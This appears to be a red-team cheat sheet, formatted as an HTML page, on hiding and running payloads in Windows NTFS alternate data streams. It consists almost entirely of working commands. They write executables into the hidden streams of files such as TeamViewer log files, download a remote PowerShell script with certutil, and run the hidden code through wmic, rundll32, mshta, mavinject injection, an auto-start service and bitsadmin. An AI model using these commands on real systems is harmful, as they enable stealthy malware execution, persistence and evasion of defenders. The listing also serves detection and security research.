<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Executing From ADS</title>
</head><body><b>#Add content to ADS</b><br/>
type C:\temp\evil.exe &gt; "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"<br/>
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe<br/>
findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp.exe &gt; c:\ADS\file.txt:procexp.exe<br/>
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt<br/>
makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab<br/>
print /D:c:\ads\file.txt:autoruns.exe c:\ads\Autoruns.exe<br/>
reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg<br/>
regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey<br/>
expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat<br/>
esentutl.exe /y C:\ADS\autoruns.exe /d c:\ADS\file.txt:autoruns.exe /o<br/>
powershell -command " &amp; {(Get-Content C:\ADS\file.exe -Raw | Set-Content C:\ADS\file.txt -Stream file.exe)}"<br/>
curl file://c:/temp/autoruns.exe --output c:\temp\textfile1.txt:auto.exe<br/>
<br/>
<b>#Executing the ADS content</b><br/>
<br/>
* WMIC<br/>
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'<br/>
<br/>
* Rundll32<br/>
rundll32 "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll",DllMain<br/>
rundll32.exe advpack.dll,RegisterOCX not_a_dll.txt:test.dll<br/>
rundll32.exe ieadvpack.dll,RegisterOCX not_a_dll.txt:test.dll<br/>
<br/>
* Cscript<br/>
cscript "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Script.vbs"<br/>
<br/>
* Wscript<br/>
wscript c:\ads\file.txt:script.vbs<br/>
<br/>
* Forfiles<br/>
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\shellloader.dll:bginfo.exe"<br/>
<br/>
* Mavinject.exe<br/>
c:\windows\SysWOW64\notepad.exe<br/>
tasklist | findstr notepad<br/>
notepad.exe &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4172 31C5CE94259D4006 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2 &nbsp; &nbsp; 18,476 K<br/>
type c:\temp\AtomicTest.dll &gt; "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"<br/>
c:\windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.16299.15_none_e07aa28c97ebfa48\mavinject.exe 4172 /INJECTRUNNING "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"<br/>
<br/>
* MSHTA<br/>
mshta "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"<br/>
<br/>
* Control.exe<br/>
control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll<br/>
https://twitter.com/bohops/status/954466315913310209<br/>
<br/>
* Create service and run<br/>
sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works &gt; \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto<br/>
sc start evilservice<br/>
https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/<br/>
<br/>
* Powershell.exe<br/>
powershell -ep bypass - &lt; c:\temp:ttt<br/>
<br/>
* Powershell.exe<br/>
powershell -command " &amp; {(Get-Content C:\ADS\1.txt -Stream file.exe -Raw | Set-Content c:\ADS\file.exe) | start-process c:\ADS\file.exe}"<br/>
<br/>
* Powershell.exe<br/>
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = C:\ads\folder:file.exe}<br/>
<br/>
* Regedit.exe<br/>
regedit c:\ads\file.txt:regfile.reg<br/>
<br/>
* Bitsadmin.exe<br/>
bitsadmin /create myfile<br/>
bitsadmin /addfile myfile c:\windows\system32\notepad.exe c:\data\playfolder\notepad.exe<br/>
bitsadmin /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL<br/>
bitsadmin /RESUME myfile<br/>
<br/>
* AppVLP.exe<br/>
AppVLP.exe c:\windows\tracing\test.txt:ha.exe</body></html>